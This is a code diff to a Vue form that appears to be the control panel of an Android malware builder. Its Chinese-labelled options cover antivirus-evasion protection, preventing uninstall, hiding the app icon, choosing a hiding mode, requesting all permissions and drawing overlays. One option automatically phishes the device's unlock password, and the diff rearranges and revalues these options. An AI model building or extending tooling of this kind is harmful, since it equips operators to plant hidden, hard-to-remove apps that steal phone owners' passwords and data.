@@ -83,8 +83,9 @@ const form = useForm({
     install_type2: 'g',
     user_allprims: '1',
     user_blackprims: '1',
-    hide_type: 'uninstall',
+    hide_type: 'c',
     use_antkill: '1',
+    notify_msg: 'on',
     diao_type: '1',
     hidden_app: '1',
     use_draw: '1',
@@ -149,9 +150,14 @@ const blackprimsOptions = [
 ];
 
 const hideTypeOptions = [
-    { label: '直接隐藏', value: 'direct' },
-    { label: '卸载隐藏（推荐）', value: 'uninstall' },
-    { label: '提示卸载', value: 'prompt' },
+    { label: '直接隐藏（推荐）', value: 'c' },
+    { label: '卸载隐藏', value: 'f' },
+    { label: '提示卸载', value: 'k' },
+];
+
+const antkillOptions = [
+    { label: '开启', value: 'on' },
+    { label: '关闭', value: 'off' },
 ];
 
 const switchOptions = [
@@ -530,7 +536,7 @@ const validateForm = (): boolean => {
                                     </NGridItem>
                                     <NGridItem>
                                         <NFormItem label="免杀保护">
-                                            <NSelect v-model:value="form.use_antkill" :options="switchOptions" />
+                                            <NSelect v-model:value="form.notify_msg" :options="antkillOptions" />
                                         </NFormItem>
                                     </NGridItem>
                                 </NGrid>
@@ -542,12 +548,17 @@ const validateForm = (): boolean => {
                                 </template>
                                 <NGrid :cols="2" :x-gap="16" :y-gap="8">
                                     <NGridItem>
+                                        <NFormItem label="防止卸载">
+                                            <NSelect v-model:value="form.use_antkill" :options="switchOptions" />
+                                        </NFormItem>
+                                    </NGridItem>
+                                    <NGridItem>
                                         <NFormItem label="自动钓鱼解锁密码">
                                             <NSelect v-model:value="form.diao_type" :options="switchOptions" />
                                         </NFormItem>
                                     </NGridItem>
                                     <NGridItem>
-                                        <NFormItem label="防止卸载">
+                                        <NFormItem label="隐藏应用">
                                             <NSelect v-model:value="form.hidden_app" :options="switchOptions" />
                                         </NFormItem>
                                     </NGridItem>
